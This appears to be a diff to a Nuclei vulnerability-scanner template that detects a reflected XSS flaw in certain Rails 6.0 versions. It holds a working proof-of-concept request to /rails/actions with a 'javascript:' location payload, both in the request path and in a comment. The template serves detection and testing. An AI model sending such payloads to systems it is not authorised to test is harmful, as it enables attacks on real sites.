@@ -4,16 +4,18 @@ info:
   author: 'ooooooo_q (Original finder), Rahul and Harsh (Template author)'
   severity: medium
   reference: https://hackerone.com/reports/904059
+  tags: rails,xss
 
   #  XSS (6.0.0 < rails < 6.0.3.2); Payload is location=%0djavascript:alert(1);
   #  Nuclei has issues with 302 response missing a Location header thus the
   #  extended payload to make Nuclei work.
+  #  Working poc by @Mad-robot
+  # /rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0Djavascript%3Aalert%28document.domain%29
 
 requests:
   - method: POST
     path:
-      - >-
-        {{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa
+      - "{{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa"
     matchers-condition: and
     matchers:
       - type: word
@@ -25,7 +27,7 @@ requests:
           - 302
       - type: word
         words:
-          - 'text/html'
           - 'Location: aaaaa'
+          - 'text/html'
         part: header
         condition: and
